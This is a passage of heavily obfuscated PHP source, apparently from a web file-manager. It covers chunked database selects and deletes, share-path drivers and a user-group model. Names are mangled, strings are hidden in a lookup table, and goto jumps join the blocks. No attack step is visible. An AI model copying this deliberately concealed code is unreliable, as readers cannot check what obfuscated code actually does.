} return parent::add($Âî…ƒØÂ, $ŒÆ™ µ®, $˜½åÙ¸); } public function parseWhereLike($‹¬Ä¦É§, $÷ĞƒÚóŒ = '', $û“¯àƒŠ = false, &$­á¥ÕŞ± = false) { $¶á›©ÀÉ =& $_SERVER[¯‘·½]; $±’°‰§ = $GLOBALS[$¶á›©ÀÉ[6]][$¶á›©ÀÉ[459]]; if (!$±’°‰§[$¶á›©ÀÉ[460]]) { return $‹¬Ä¦É§; } if (!is_array($‹¬Ä¦É§)) { return $‹¬Ä¦É§; } $·¢ü‚ = array(); $á¦Ÿç³ = 0; foreach ($‹¬Ä¦É§ as $¢ñÑÆ‘ => $å­ª¤„€) { if (is_array($å­ª¤„€) && count($å­ª¤„€) == 2 && $å­ª¤„€[0] == $¶á›©ÀÉ[461] && is_string($å­ª¤„€[1]) && substr($å­ª¤„€[1], 0, 1) == $¶á›©ÀÉ[462] && substr($å­ª¤„€[1], strlen($å­ª¤„€[1]) - 1, 1) == $¶á›©ÀÉ[462]) { $­á¥ÕŞ± = !0; $³²¹“¶¦ = is_string($¢ñÑÆ‘) ? $¢ñÑÆ‘ : $÷ĞƒÚóŒ; $°µ†»Ë„ = substr($å­ª¤„€[1], 1, strlen($å­ª¤„€[1]) - 2); $°µ†»Ë„ = $this->db->escapeString($°µ†»Ë„); if (!strpos($³²¹“¶¦, $¶á›©ÀÉ[10])) { $³²¹“¶¦ = $¶á›©ÀÉ[463] . $³²¹“¶¦ . $¶á›©ÀÉ[463]; } $™—Äõ»ˆ = $¶á›©ÀÉ[223] . $°µ†»Ë„ . $¶á›©ÀÉ[223]; $°µ†»Ë„ = str_replace(array($¶á›©ÀÉ[10], $¶á›©ÀÉ[464], $¶á›©ÀÉ[11]), $¶á›©ÀÉ[465], $°µ†»Ë„); if ($±’°‰§[$¶á›©ÀÉ[466]]) { $™—Äõ»ˆ = $¶á›©ÀÉ[467] . $°µ†»Ë„ . $¶á›©ÀÉ[468]; if ($±’°‰§[$¶á›©ÀÉ[469]]) { $™—Äõ»ˆ = $¶á›©ÀÉ[468] . $°µ†»Ë„ . $¶á›©ÀÉ[467]; } } $·¢ü‚[$á¦Ÿç³] = $¶á›©ÀÉ[470] . $³²¹“¶¦ . $¶á›©ÀÉ[471] . $™—Äõ»ˆ . $¶á›©ÀÉ[472]; $á¦Ÿç³++; continue; } if (is_array($å­ª¤„€)) { $÷ĞƒÚóŒ = is_string($¢ñÑÆ‘) ? $¢ñÑÆ‘ : $÷ĞƒÚóŒ; $å­ª¤„€ = $this->parseWhereLike($å­ª¤„€, $÷ĞƒÚóŒ, !0, $­á¥ÕŞ±); } if (is_numeric($¢ñÑÆ‘)) { $·¢ü‚[$á¦Ÿç³] = $å­ª¤„€; $á¦Ÿç³++; } else { $·¢ü‚[$¢ñÑÆ‘] = $å­ª¤„€; } } if ($­á¥ÕŞ± && !$û“¯àƒŠ) { } return $·¢ü‚; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ˆ¬ÕíêÄ = array()) { $¨€¥áşû =& $_SERVER[¯‘·½]; $şî·ÔÎä = self::SQL_WHERE_IN_CHUNK; $€Ÿ÷íÒ¡ = $this->optionsValue(); $ƒíÎ‹ıĞ = $this->findWhereField($€Ÿ÷íÒ¡); if (!$ƒíÎ‹ıĞ || isset($€Ÿ÷íÒ¡[$¨€¥áşû[370]]) || isset($€Ÿ÷íÒ¡[$¨€¥áşû[430]])) { return parent::select($ˆ¬ÕíêÄ); } $ÊÇ‚”ƒÃ = $€Ÿ÷íÒ¡[$¨€¥áşû[355]][$ƒíÎ‹ıĞ][1]; $ÊÇ‚”ƒÃ = is_array($ÊÇ‚”ƒÃ) ? $ÊÇ‚”ƒÃ : array(); $ùä¿û¥ = null; for ($­«´ÑÎ« = 0; $­«´ÑÎ« < count($ÊÇ‚”ƒÃ); $­«´ÑÎ« += $şî·ÔÎä) { $—µàÓš = array_slice($ÊÇ‚”ƒÃ, $­«´ÑÎ«, $şî·ÔÎä); if (!is_array($—µàÓš) || count($—µàÓš) == 0) { break; } $€Ÿ÷íÒ¡[$¨€¥áşû[355]][$ƒíÎ‹ıĞ][1] = $—µàÓš; $this->optionsValue($€Ÿ÷íÒ¡); $›ßÈØÊ¨ = parent::select($ˆ¬ÕíêÄ); if (!$›ßÈØÊ¨) { continue; } $ùä¿û¥ = is_array($ùä¿û¥) ? $ùä¿û¥ : array(); $ùä¿û¥ = array_merge($ùä¿û¥, $›ßÈØÊ¨); } return $ùä¿û¥; } public function delete($ò³ã½õ‰ = array()) { $³ÛŸŸˆ =& $_SERVER[¯‘·½]; $˜½··»½ = self::SQL_WHERE_IN_CHUNK; $æìÉª = $this->optionsValue(); $ä´Åãâ = $this->findWhereField($æìÉª); if (!$ä´Åãâ) { return parent::delete($ò³ã½õ‰); } $çÚİëÜú = 0; $õê¸á‰ï = $æìÉª[$³ÛŸŸˆ[355]][$ä´Åãâ][1]; $õê¸á‰ï = is_array($õê¸á‰ï) ? $õê¸á‰ï : array(); for ($ÊÛ§Ü™ò = 0; $ÊÛ§Ü™ò < count($õê¸á‰ï); $ÊÛ§Ü™ò += $˜½··»½) { $ç¦µ¯şç = array_slice($õê¸á‰ï, $ÊÛ§Ü™ò, $˜½··»½); if (!is_array($ç¦µ¯şç) || count($ç¦µ¯şç) == 0) { break; } $æìÉª[$³ÛŸŸˆ[355]][$ä´Åãâ][1] = $ç¦µ¯şç; $this->optionsValue($æìÉª); $çÚİëÜú += parent::delete($ò³ã½õ‰); } return $çÚİëÜú; } private function findWhereField($ÌØ¬À¸) { $ÛÉºğäã =& $_SERVER[¯‘·½]; $»õ·„µÌ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÌØ¬À¸) || !is_array($ÌØ¬À¸[$ÛÉºğäã[355]])) { return !1; } foreach ($ÌØ¬À¸[$ÛÉºğäã[355]] as $ò¨œ®å½ => $¢Üä’) { if (is_array($¢Üä’) && isset($¢Üä’[0]) && is_string($¢Üä’[0]) && strtolower($¢Üä’[0]) == $ÛÉºğäã[7] && is_array($¢Üä’[1]) && count($¢Üä’[1]) > $»õ·„µÌ) { ignore_timeout(); return $ò¨œ®å½; } } return !1; } public function setMasterDB($‚Ê³øÚ± = true) { think_config($_SERVER[¯‘·½][473], $‚Ê³øÚ±); } } goto C¬Å°¦Ş¾; AÌµ¥âéÅƒ: class PathDriverDriverShareItem { public function __construct($îìÙï È) { $this->pathParse = $îìÙï È; } public function __call($ÉÛ¶Œö, $¸Ô­¹ĞŒ) { $ö¤Í“é› =& $_SERVER[¯‘·½]; if (method_exists($this, $ÉÛ¶Œö)) { return; } $ùÏ„¾Ëœ = call_user_func_array(array($ö¤Í“é›[1461], $ÉÛ¶Œö), $¸Ô­¹ĞŒ); $ÁÔ‚¸è§ = array($ö¤Í“é›[1462], $ö¤Í“é›[1463], $ö¤Í“é›[1464], $ö¤Í“é›[1465], $ö¤Í“é›[625], $ö¤Í“é›[627], $ö¤Í“é›[1466], $ö¤Í“é›[110], $ö¤Í“é›[1467], $ö¤Í“é›[1468]); if (in_array($ÉÛ¶Œö, $ÁÔ‚¸è§)) { $ùÏ„¾Ëœ = $this->getPathOuter($ùÏ„¾Ëœ); } return $ùÏ„¾Ëœ; } public function copy($“€âØ¥ï, $¿îôî, $ê”åç«¿ = false, $ÎèëÔ› = false) { return $this->copyMove($“€âØ¥ï, $¿îôî, $ê”åç«¿, $_SERVER[¯‘·½][625], $ÎèëÔ›); } public function move($ÙÅõùÊì, $°°©˜†¯, $Ä§Æ°…à = false, $¬ãØ¡Ñ‹ = false) { return $this->copyMove($ÙÅõùÊì, $°°©˜†¯, $Ä§Æ°…à, $_SERVER[¯‘·½][627], $¬ãØ¡Ñ‹); } private function copyMove($Üï»Ê¶ı, $÷ˆöĞ’–, $û¿Ö˜ÂÔ, $•ü¥±ÛÄ, $ÛàÍå = false) { $÷®°«° =& $_SERVER[¯‘·½]; $÷ª¾¹ò = $÷ˆöĞ’–; $áóˆúõã = IO::driverMake($÷ˆöĞ’–); if ($áóˆúõã->pathParse[$÷®°«°[1254]]) { $÷ˆöĞ’– = $áóˆúõã->pathParse[$÷®°«°[1254]]; } else { $÷ˆöĞ’– = $÷ª¾¹ò; } $½£Õ = IO::copyMove($Üï»Ê¶ı, $÷ˆöĞ’–, $û¿Ö˜ÂÔ, $•ü¥±ÛÄ, $ÛàÍå); $½£Õ = $this->getPathOuter($½£Õ); return $½£Õ; } public function pathThis($Ëœ¸îŒÊ) { return get_path_this($this->pathParse[$_SERVER[¯‘·½][87]]); } public function pathFather($Š¥·¤çı) { return get_path_father($this->pathParse[$_SERVER[¯‘·½][87]]); } public function iconvSystem($·í³à“û) { return $·í³à“û; } protected function infoParse($ôî ™şü, $½¯ôÅ = false) { $Õéú’Æó =& $_SERVER[¯‘·½]; $ıÃ©áÅ¡ = $this->pathParse[$Õéú’Æó[564]][$Õéú’Æó[1281]] . $this->pathParse[$Õéú’Æó[1273]]; if ($½¯ôÅ) { $£ËÉ£ûĞ = IO::infoWithChildren($ıÃ©áÅ¡); } else { $£ËÉ£ûĞ = IO::info($ıÃ©áÅ¡); } $İ¸µŒ¢ô = $this->pathParse[$Õéú’Æó[564]]; return Action($Õéú’Æó[1459])->_shareItemeParse($£ËÉ£ûĞ, $İ¸µŒ¢ô); } public function listAll($ Èœàªê) { $Ï‹˜õí¾ =& $_SERVER[¯‘·½]; $©şÀ€œ÷ = IO::listAll($ Èœàªê); $Ä×Ü±Ç = rtrim($this->pathParse[$Ï‹˜õí¾[564]][$Ï‹˜õí¾[1281]], $Ï‹˜õí¾[8]); foreach ($©şÀ€œ÷ as &$ƒÈÖŒÂÌ) { $ƒÈÖŒÂÌ[$Ï‹˜õí¾[87]] = $this->pathDriver . $Ï‹˜õí¾[8] . ltrim(substr($ƒÈÖŒÂÌ[$Ï‹˜õí¾[87]], strlen($Ä×Ü±Ç)), $Ï‹˜õí¾[8]); } unset($ƒÈÖŒÂÌ); return $©şÀ€œ÷; } public function listAllSimple($úÑéŞ–ç, $ˆ’€Óƒ¹ = false) { $ëêÒÏ‘ =& $_SERVER[¯‘·½]; $¤ßìŸ•­ = $this->listAll($úÑéŞ–ç); $æüÆ™¤« = $this->pathParse[$ëêÒÏ‘[497]]; if (trim($æüÆ™¤«, $ëêÒÏ‘[8]) == trim(get_path_father($æüÆ™¤«), $ëêÒÏ‘[8])) { $ˆ’€Óƒ¹ = !0; } return IO::init($ëêÒÏ‘[12])->listAllSimpleMake($¤ßìŸ•­, $æüÆ™¤«, $ˆ’€Óƒ¹); } public function getPathOuter($¤ıå’ãØ) { $ÉØ’ü¹Ğ =& $_SERVER[¯‘·½]; $íêïíîÀ = KodIO::parse($¤ıå’ãØ); if ($íêïíîÀ[$ÉØ’ü¹Ğ[33]] == KodIO::KOD_SHARE_ITEM) { return $íêïíîÀ[$ÉØ’ü¹Ğ[87]]; } $«¼ö±øò = KodIO::clear($¤ıå’ãØ); $êê¤ÁğÒ = KodIO::clear($this->pathParse[$ÉØ’ü¹Ğ[564]][$ÉØ’ü¹Ğ[1281]]); $ê®±¯æ = substr($«¼ö±øò, strlen($êê¤ÁğÒ)); if (substr($«¼ö±øò, 0, strlen($êê¤ÁğÒ)) != $êê¤ÁğÒ) { return !1; } return $this->pathParse[$ÉØ’ü¹Ğ[1274]] . $ÉØ’ü¹Ğ[8] . ltrim($ê®±¯æ, $ÉØ’ü¹Ğ[8]); } public function getType() { $¿¾ÌéÌ÷ =& $_SERVER[¯‘·½]; $Ö‹©ó½ = str_replace($¿¾ÌéÌ÷[77], $¿¾ÌéÌ÷[12], get_class($this)); return strtolower($Ö‹©ó½); } public function isOsDriver($¹Ìª ç–) { return IO::isOsDriver($¹Ìª ç–); } public function info($ÇãÜùö¸) { return $this->infoParse($ÇãÜùö¸); } public function infoAuth($¿ªß€å) { return $this->infoParse($¿ªß€å); } public function infoWithChildren($Ôûà‚À†) { return $this->infoParse($Ôûà‚À†, !0); } public function infoFull($Ã±îí†ß) { return $this->infoParse($Ã±îí†ß); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ëº¾‹ó—) { $this->pathParse = $ëº¾‹ó—; } protected function infoParse($€è”ÕÜî, $ş•ÂŸÎ = false) { $ù‡¥ğ—ê =& $_SERVER[¯‘·½]; return Action($ù‡¥ğ—ê[1280])->sharePathInfo($this->pathParse[$ù‡¥ğ—ê[87]], !0, $ş•ÂŸÎ); } public function listPath($ûó©Ëõ , $Ú²—ª¹á = false) { $ß¡ÅÍ£Å =& $_SERVER[¯‘·½]; $ÉÆéÑ‰ = IO::listPath($ûó©Ëõ , $Ú²—ª¹á); if (!$ÉÆéÑ‰) { return $ÉÆéÑ‰; } if (is_array($ÉÆéÑ‰[$ß¡ÅÍ£Å[1460]])) { $ºÇæÒ‹Ÿ = Action($ß¡ÅÍ£Å[1469])->parsePathChildren($ÉÆéÑ‰[$ß¡ÅÍ£Å[1460]], array($ß¡ÅÍ£Å[497] => $ûó©Ëõ )); $ÉÆéÑ‰[$ß¡ÅÍ£Å[1460]] = Action($ß¡ÅÍ£Å[1280])->shareItemInfo($ºÇæÒ‹Ÿ); } foreach ($ÉÆéÑ‰ as $¹ÄôñÙé => $Ò³–ş÷ª) { if (!in_array($¹ÄôñÙé, array($ß¡ÅÍ£Å[86], $ß¡ÅÍ£Å[85]))) { continue; } foreach ($Ò³–ş÷ª as $Ÿ¸ÑŞÕé => $ºÇæÒ‹Ÿ) { $ºÇæÒ‹Ÿ = Action($ß¡ÅÍ£Å[1469])->parsePathChildren($ºÇæÒ‹Ÿ, array($ß¡ÅÍ£Å[497] => $ûó©Ëõ )); $ÉÆéÑ‰[$¹ÄôñÙé][$Ÿ¸ÑŞÕé] = Action($ß¡ÅÍ£Å[1280])->shareItemInfo($ºÇæÒ‹Ÿ); } } return $ÉÆéÑ‰; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($µ±å–Æ) { parent::__construct($µ±å–Æ); $this->setSignVersion($_SERVER[¯‘·½][250]); } } goto F»´ÃÉ«°å; e‹õ±ô‚Ì: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\x65" => "\147\162\x6f\x75\x70\x5f\155\x65\x74\x61", "\155\x65\x74\141\x46\151\x65\154\144" => "\x67\x72\157\x75\x70\x49\104"); protected function cacheFunctionAlias($ü«£ªôª) { $Å¹‡©´Ù =& $_SERVER[¯‘·½]; return array($Å¹‡©´Ù[2088] => array($ü«£ªôª[0], $Å¹‡©´Ù[2089]), $Å¹‡©´Ù[2090] => array($ü«£ªôª[0], $Å¹‡©´Ù[2091])); } protected function getInfo($‚Ç—ÙÆƒ, $Ëš¥˜Ÿì = false) { $µéô¯ ı = $this->getInfoSimple($‚Ç—ÙÆƒ); if (!$µéô¯ ı) { return !1; } if ($Ëš¥˜Ÿì) { return $this->_listDataApplyItem($µéô¯ ı); } return $this->cacheFunctionGet($_SERVER[¯‘·½][2092], $‚Ç—ÙÆƒ); } protected function getInfoSimple($İÆ½è®ı, $Æµ¥õÍÂ = false) { $›¬ªÏ† =& $_SERVER[¯‘·½]; if ($Æµ¥õÍÂ) { $ÊáşÈ¶ = array($›¬ªÏ†[1414] => intval($İÆ½è®ı)); $ô¢¼¶© = $this->where($ÊáşÈ¶)->find(); return is_array($ô¢¼¶©) ? $ô¢¼¶© : array(); } return $this->cacheFunctionGet($›¬ªÏ†[2093], $İÆ½è®ı); } protected function groupAdd($™¬ÉìÙÑ) { $ÏÜ•‰›Æ =& $_SERVER[¯‘·½]; if (!$™¬ÉìÙÑ[$ÏÜ•‰›Æ[193]] && isset($™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]]) && $™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]] == 1) { if ($Á¥ã¹ôÃ = $this->getInfoSimple($™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]], !0)) { return $™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]]; } } else { $Á¥ã¹ôÃ = $this->getInfoSimple($™¬ÉìÙÑ[$ÏÜ•‰›Æ[193]]); if (!$Á¥ã¹ôÃ) { return !1; } } $Å‰îâ¸­ = $ÏÜ•‰›Æ[597]; if ($Á¥ã¹ôÃ[$ÏÜ•‰›Æ[588]]) { $Å‰îâ¸­ = $Á¥ã¹ôÃ[$ÏÜ•‰›Æ[588]] . $Á¥ã¹ôÃ[$ÏÜ•‰›Æ[1414]] . $ÏÜ•‰›Æ[50]; } $ÍÑ×€¦— = array($ÏÜ•‰›Æ[496] => $this->groupNameAuto($™¬ÉìÙÑ[$ÏÜ•‰›Æ[193]], $™¬ÉìÙÑ[$ÏÜ•‰›Æ[32]]), $ÏÜ•‰›Æ[479] => $™¬ÉìÙÑ[$ÏÜ•‰›Æ[193]], $ÏÜ•‰›Æ[659] => $Å‰îâ¸­, $ÏÜ•‰›Æ[2094] => $™¬ÉìÙÑ[$ÏÜ•‰›Æ[1993]], $ÏÜ•‰›Æ[2095] => 0, $ÏÜ•‰›Æ[2010] => 0); $™¬ÉìÙÑ[$ÏÜ•‰›Æ[32]] = $ÍÑ×€¦—[$ÏÜ•‰›Æ[32]]; if (isset($™¬ÉìÙÑ[$ÏÜ•‰›Æ[2030]])) { $ÍÑ×€¦—[$ÏÜ•‰›Æ[2030]] = $™¬ÉìÙÑ[$ÏÜ•‰›Æ[2030]]; } else { $ŸÍÆÃ¥¤ = $this->max($ÏÜ•‰›Æ[2030]); if (!$ŸÍÆÃ¥¤) { $ŸÍÆÃ¥¤ = 0; } $ÍÑ×€¦—[$ÏÜ•‰›Æ[2030]] = $ŸÍÆÃ¥¤ + 1; } if (!empty($™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]])) { $ÍÑ×€¦—[$ÏÜ•‰›Æ[1414]] = $™¬ÉìÙÑ[$ÏÜ•‰›Æ[1414]]; } $ğ¥ë×Ş = $this->add($ÍÑ×€¦—); $this->groupMetaEdit($ğ¥ë×Ş, $™¬ÉìÙÑ); Model($ÏÜ•‰›Æ[1452])->groupRootAdd($ğ¥ë×Ş); $this->_clearCache($™¬ÉìÙÑ[$ÏÜ•‰›Æ[193]]); return $ğ¥ë×Ş; } protected function groupEdit($İ±åºê«, $óŒõø‰) { $´÷º¸• =& $_SERVER[¯‘·½]; $û¦¯ÁÔÁ = $this->getInfoSimple($İ±åºê«); if (!$û¦¯ÁÔÁ) { return !1; } if (!empty($óŒõø‰[$´÷º¸•[193]])) { $“¹Ö°˜… = $this->getInfoSimple($óŒõø‰[$´÷º¸•[193]]); if (!$“¹Ö°˜…) { return !1; } if ($û¦¯ÁÔÁ[$´÷º¸•[1414]] == $“¹Ö°˜…[$´÷º¸•[1414]]) { return !1; } if ($óŒõø‰[$´÷º¸•[193]] != $û¦¯ÁÔÁ[$´÷º¸•[193]]) { if ($“¹Ö°˜…[$´÷º¸•[588]] !== $û¦¯ÁÔÁ[$´÷º¸•[588]] && strpos($“¹Ö°˜…[$´÷º¸•[588]], $û¦¯ÁÔÁ[$´÷º¸•[588]] . $û¦¯ÁÔÁ[$´÷º¸•[1414]] . $´÷º¸•[50]) === 0) { return !1; } $óŒõø‰[$´÷º¸•[659]] = $“¹Ö°˜…[$´÷º¸•[588]] . $óŒõø‰[$´÷º¸•[193]] . $´÷º¸•[50]; $this->_changeChildLevel($û¦¯ÁÔÁ, $“¹Ö°˜…); $this->_clearCache($“¹Ö°˜…[$´÷º¸•[1414]]); $this->_clearCache($û¦¯ÁÔÁ[$´÷º¸•[193]]); } } $this->groupMetaEdit($İ±åºê«, $óŒõø‰); $this->_clearChildrenCache($û¦¯ÁÔÁ); return $this->where(array($´÷º¸•[2096] => $İ±åºê«))->save($óŒõø‰); } private function groupMetaEdit($ÎŸÒÎû¸, &$³ÖÉ¥Ş) { $¬šêœ¹Å =& $_SERVER[¯‘·½]; if (isset($³ÖÉ¥Ş[$¬šêœ¹Å[32]])) { $this->setNamePinyin($ÎŸÒÎû¸, $³ÖÉ¥Ş[$¬šêœ¹Å[32]]); } if (isset($³ÖÉ¥Ş[$¬šêœ¹Å[2097]])) { $“¥œæÂ“ = array($¬šêœ¹Å[2097] => $³ÖÉ¥Ş[$¬šêœ¹Å[2097]], $¬šêœ¹Å[2098] => $³ÖÉ¥Ş[$¬šêœ¹Å[2098]]); unset($³ÖÉ¥Ş[$¬šêœ¹Å[2097]]); unset($³ÖÉ¥Ş[$¬šêœ¹Å[2098]]); if (isset($³ÖÉ¥Ş[$¬šêœ¹Å[2099]])) { $¶¹÷¼øš = $¬šêœ¹Å[1410] . $ÎŸÒÎû¸; $°¸Ö¥ä” = $¬šêœ¹Å[1409]; $ùŠ×»Šæ = $³ÖÉ¥Ş[$¬šêœ¹Å[2099]] ? $³ÖÉ¥Ş[$¬šêœ¹Å[2099]] : $¬šêœ¹Å[12]; $ÄÍ×åµì = Model($¬šêœ¹Å[1408])->get($¶¹÷¼øš, $°¸Ö¥ä”); $ÄÍ×åµì = $ÄÍ×åµì ? $ÄÍ×åµì : $¬šêœ¹Å[12]; if ($ÄÍ×åµì != $ùŠ×»Šæ) { if (!$ùŠ×»Šæ && $ÄÍ×åµì) { Model($¬šêœ¹Å[1408])->remove($¶¹÷¼øš, $°¸Ö¥ä”); } else { if ($ùŠ×»Šæ) { Model($¬šêœ¹Å[1408])->set($¶¹÷¼øš, $ùŠ×»Šæ, $°¸Ö¥ä”); } } } $“¥œæÂ“[$¬šêœ¹Å[2099]] = $ùŠ×»Šæ; } $this->metaSet($ÎŸÒÎû¸, $“¥œæÂ“); } } private function _clearChildrenCache($Èø£Öª•) { $çÇĞŠ» =& $_SERVER[¯‘·½]; $·ÎÏÂµ¹ = array($çÇĞŠ»[659] => array($çÇĞŠ»[619], $Èø£Öª•[$çÇĞŠ»[588]] . $Èø£Öª•[$çÇĞŠ»[1414]] . $çÇĞŠ»[620])); $›”ãƒø = $this->field($çÇĞŠ»[1414])->where($·ÎÏÂµ¹)->select(); foreach ($›”ãƒø as $êÄ» ö—) { $this->_clearCache($êÄ» ö—[$çÇĞŠ»[1414]]); } } private function _clearCache($ˆÔ½Œ±Ù) { $™¥´¬Ü¢ =& $_SERVER[¯‘·½]; $this->cacheFunctionClear($™¥´¬Ü¢[2092], $ˆÔ½Œ±Ù); $this->cacheFunctionClear($™¥´¬Ü¢[2093], $ˆÔ½Œ±Ù); } private function _changeChildLevel($şã‡ê©–, $Ú¢èĞƒ, $Öå²¾– = false) { $Áº…ú¹á =& $_SERVER[¯‘·½]; $Ùš­æÖä = $şã‡ê©–[$Áº…ú¹á[588]] . $şã‡ê©–[$Áº…ú¹á[1414]] . $Áº…ú¹á[50]; $ÁÚÆµÌ = $Ú¢èĞƒ[$Áº…ú¹á[588]] . $Ú¢èĞƒ[$Áº…ú¹á[1414]] . $Áº…ú¹á[50] . $şã‡ê©–[$Áº…ú¹á[1414]] . $Áº…ú¹á[50]; if ($Öå²¾–) { $ÁÚÆµÌ = $Ú¢èĞƒ[$Áº…ú¹á[588]] . $Ú¢èĞƒ[$Áº…ú¹á[1414]] . $Áº…ú¹á[50]; } $¼ÔÚ³¿ì = array($Áº…ú¹á[659] => array($Áº…ú¹á[619], $şã‡ê©–[$Áº…ú¹á[588]] . $şã‡ê©–[$Áº…ú¹á[1414]] . $Áº…ú¹á[620])); $§»ÀÚÈ = array($Áº…ú¹á[659] => array($Áº…ú¹á[668], "\162\x65\160\154\x61\x63\145\50\x70\141\162\x65\156\164\x4c\145\166\x65\154\54\x27{$Ùš­æÖä}\47\x2c\x27{$ÁÚÆµÌ}\x27\51")); $this->_clearChildrenCache($şã‡ê©–); $this->where($¼ÔÚ³¿ì)->data($§»ÀÚÈ)->save(); } public function setNamePinyin($“–É·Œ, $ŸÂ¼…÷¶ = false) { $¦ÙŞèï =& $_SERVER[¯‘·½]; if (!$ŸÂ¼…÷¶) { $¿ÇÔÌÎ™ = $this->getInfoSimple($“–É·Œ); $ŸÂ¼…÷¶ = $¿ÇÔÌÎ™[$¦ÙŞèï[32]]; } if (!Input::check($ŸÂ¼…÷¶, $¦ÙŞèï[662])) { $this->metaSet($“–É·Œ, $¦ÙŞèï[540], null); $this->metaSet($“–É·Œ, $¦ÙŞèï[539], null); return; } $ÔÂ•üİ¸ = array($¦ÙŞèï[540] => str_replace($¦ÙŞèï[53], $¦ÙŞèï[12], Pinyin::get($ŸÂ¼…÷¶)), $¦ÙŞèï[539] => Pinyin::get($ŸÂ¼…÷¶, $¦ÙŞèï[663])); $this->metaSet($“–É·Œ, $ÔÂ•üİ¸); } protected function metaSet($€˜ü½¯, $Ñì˜š†œ = null, $îªÜ¾«ì = null) { $this->_clearCache($€˜ü½¯); return parent::metaSet($€˜ü½¯, $Ñì˜š†œ, $îªÜ¾«ì); } protected function groupStatus($Ëá¹š³œ, $Ö½ş‡”•) { $ıèÂ ™— =& $_SERVER[¯‘·½]; $ƒèÇÒš† = $this->getInfoSimple($Ëá¹š³œ); if (!$ƒèÇÒš†) { return !1; } $this->_clearCache($Ëá¹š³œ); return $this->metaSet($Ëá¹š³œ, $ıèÂ ™—[835], $Ö½ş‡”•); if ($Ö½ş‡”• == $ıèÂ ™—[91]) { $ŠËà·òš = $this->parentLevelArray($ƒèÇÒš†[$ıèÂ ™—[588]]); } else { } $ŠËà·òš[] = $ƒèÇÒš†[$ıèÂ ™—[1414]]; $ú¿¾Ä«Û = array(); foreach ($ŠËà·òš as $Ëá¹š³œ) { $ú¿¾Ä«Û[] = array($ıèÂ ™—[1414] => $Ëá¹š³œ, $ıèÂ ™—[97] => $ıèÂ ™—[835], $ıèÂ ™—[452] => $Ö½ş‡”•); $this->_clearCache($Ëá¹š³œ); } return Model($ıèÂ ™—[2100])->addAll($ú¿¾Ä«Û, array(), !0); } protected function groupRemove($×Öæâ»•, $ÁèùíÖ© = false) { $è©à¬†Â =& $_SERVER[¯‘·½]; $£„ƒ® = array($è©à¬†Â[1414] => $×Öæâ»•); $İ½€«…œ = $this->where($£„ƒ®)->find(); if (!$İ½€«…œ || $İ½€«…œ[$è©à¬†Â[193]] == 0) { return !1; } if (!$ÁèùíÖ©) { $¨Ç¤şÅ‚ = $this->getInfoSimple($İ½€«…œ[$è©à¬†Â[193]]); $this->_changeChildLevel($İ½€«…œ, $¨Ç¤şÅ‚, !0); $this->where(array($è©à¬†Â[193] => $×Öæâ»•))->save(array($è©à¬†Â[193] => $İ½€«…œ[$è©à¬†Â[193]])); $this->_clearCache($¨Ç¤şÅ‚[$è©à¬†Â[1414]]); } Model($è©à¬†Â[2100])->where($£„ƒ®)->delete(); Model($è©à¬†Â[2101])->where($£„ƒ®)->delete(); Model($è©à¬†Â[916])->groupRootRemove($×Öæâ»•); $this->_clearCache($İ½€«…œ[$è©à¬†Â[193]]); return $this->where($£„ƒ®)->delete(); } protected function groupSort($ëÑËµÓÄ) { $ÇôÔÙúØ =& $_SERVER[¯‘·½]; $û³¨è‚ = array(); foreach ($ëÑËµÓÄ as $‘©ãáÖĞ => $ôÌšÑÙØ) { $û³¨è‚[] = array($ÇôÔÙúØ[1414], $ôÌšÑÙØ, $ÇôÔÙúØ[2030], $‘©ãáÖĞ + 1); } $this->saveAll($û³¨è‚); } public function listData() { $Ñ™•Š¾¹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ñ™•Š¾¹[$_SERVER[¯‘·½][447]]); return $Ñ™•Š¾¹; } private function _makeOrder($Í‚çªÃ = '') { $¹Íß¢Åœ =& $_SERVER[¯‘·½]; $‰Ãß¢€… = array($¹Íß¢Åœ[1414], $¹Íß¢Åœ[32], $¹Íß¢Åœ[1995], $¹Íß¢Åœ[234]); $´ğÃ­Ãö = array($¹Íß¢Åœ[525] => $¹Íß¢Åœ[526], $¹Íß¢Åœ[527] => $¹Íß¢Åœ[528]); $»¸¢È¨Ú = Input::get($¹Íß¢Åœ[532], $¹Íß¢Åœ[7], $¹Íß¢Åœ[2010], $‰Ãß¢€…); $‚«›úİŒ = Input::get($¹Íß¢Åœ[533], $¹Íß¢Åœ[7], $¹Íß¢Åœ[2102], array($¹Íß¢Åœ[2102], $¹Íß¢Åœ[527])); $‚«›úİŒ = $´ğÃ­Ãö[$‚«›úİŒ]; $Í‚çªÃ = $Í‚çªÃ . "{$»¸¢È¨Ú}\40{$‚«›úİŒ}\x2c\x20\147\x72\x6f\165\160\111\104\40\141\163\143"; return $this->order($Í‚çªÃ); } public function listChild($‡Íãµ¥¹) { $ò­¸Œ“ï =& $_SERVER[¯‘·½]; $š„ÓÎï = $this->where(array($ò­¸Œ“ï[193] => $‡Íãµ¥¹))->_makeOrder()->selectPage(200); $this->_listDataApply($š„ÓÎï[$ò­¸Œ“ï[447]]); return $š„ÓÎï; } public function listChildIds($·¡Ìšœ®) { $Ş¾ŠÀ§œ =& $_SERVER[¯‘·½]; if (is_string($È¥²õó)) { $·¡Ìšœ® = explode($Ş¾ŠÀ§œ[50], $·¡Ìšœ®); } $á„í÷­ = $this->where(array($Ş¾ŠÀ§œ[1414] => array($Ş¾ŠÀ§œ[7], $·¡Ìšœ®)))->field($Ş¾ŠÀ§œ[2103])->select(); if (!$á„í÷­) { return !1; } $üÒÒûÛÁ = array(); foreach ($á„í÷­ as $ËÁû†š§) { $üÒÒûÛÁ[] = 